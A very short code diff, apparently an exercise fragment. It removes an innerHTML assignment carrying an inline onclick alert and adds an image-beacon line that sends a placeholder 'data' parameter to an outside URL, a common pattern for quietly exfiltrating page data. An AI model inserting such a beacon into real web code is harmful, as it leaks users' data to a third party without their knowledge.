@@ -1,1 +1,2 @@
-document.body.innerHTML = "<div onclick='alert(\"exercise\")'>Exercise</div>";
+
+new Image().src = "https://claude.com/?data=...";
